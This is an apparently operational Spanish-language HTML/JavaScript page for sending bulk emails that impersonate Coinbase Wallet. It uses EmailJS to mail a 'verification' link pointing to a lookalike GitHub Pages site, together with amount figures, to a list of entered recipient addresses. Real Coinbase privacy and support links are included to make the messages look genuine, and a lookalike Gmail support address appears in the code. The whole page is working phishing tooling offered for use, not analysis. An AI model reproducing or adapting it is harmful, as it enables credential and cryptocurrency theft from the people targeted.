<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Envío Masivo de Verificación - Coinbase Wallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      background-color: #f8f8f8;
      font-family: 'Georgia', serif;
      margin: 0;
      padding: 20px;
    }

    .form-container {
      max-width: 550px;
      background-color: #fff;
      margin: 40px auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      color: #1652F0;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 15px;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-family: Georgia, serif;
    }

    button {
      margin-top: 25px;
      width: 100%;
      background-color: #1652F0;
      color: white;
      border: none;
      padding: 12px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0e3fc1;
    }

    .success, .error {
      margin-top: 20px;
      text-align: center;
      font-weight: bold;
    }

    .success { color: green; }
    .error { color: red; }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Envío Masivo de Verificación</h2>

    <label for="amount">Monto en Euros:</label>
    <input type="number" id="amount" step="0.01" placeholder="Ej: 150">

    <label for="percentage">Porcentaje a Aplicar (%):</label>
    <input type="number" id="percentage" step="0.1" placeholder="Ej: 15">

    <label for="emails">Correos destino (separados por coma):</label>
    <textarea id="emails" rows="4" placeholder="cliente1@gmail.com, cliente2@hotmail.com"></textarea>

    <button onclick="enviarEmails()">Enviar Correos</button>

    <div id="mensaje" class="success" style="display:none;">Todos los correos fueron enviados con éxito.</div>
    <div id="error" class="error" style="display:none;">Hubo errores en algunos envíos. Revisa la consola.</div>
  </div>

  <script>
    emailjs.init("GcwA-UmY0n3HlTID1"); // Tu Public Key

    async function enviarEmails() {
      const amount = parseFloat(document.getElementById("amount").value);
      const percentage = parseFloat(document.getElementById("percentage").value);
      const emailsInput = document.getElementById("emails").value;
      const msg = document.getElementById("mensaje");
      const err = document.getElementById("error");

      msg.style.display = "none";
      err.style.display = "none";

      if (!amount || !percentage || !emailsInput) {
        alert("Completa todos los campos correctamente.");
        return;
      }

      const amount9 = (amount * (percentage / 100)).toFixed(2);
      const emails = emailsInput.split(",").map(e => e.trim()).filter(e => e && e !== "coinbbasewallethelpp2025@gmail.com");

      let errores = 0;

      for (const correo of emails) {
        const params = {
          to_email: correo,
          amount: amount.toFixed(2),
          amount9: amount9,
          verification_link: "https://helpacount.github.io/supportcoinbasewallet/",
          privacy_policy: "https://www.coinbase.com/legal/privacy",
          support_link: "https://help.coinbase.com/"
        };

        try {
          await emailjs.send("service_la42lzn", "template_lccaefq", params);
          console.log(`✅ Enviado a: ${correo}`);
        } catch (e) {
          console.error(`❌ Error con ${correo}`, e);
          errores++;
        }
      }

      if (errores === 0) {
        msg.style.display = "block";
      } else {
        err.style.display = "block";
      }
    }
  </script>
</body>
</html>
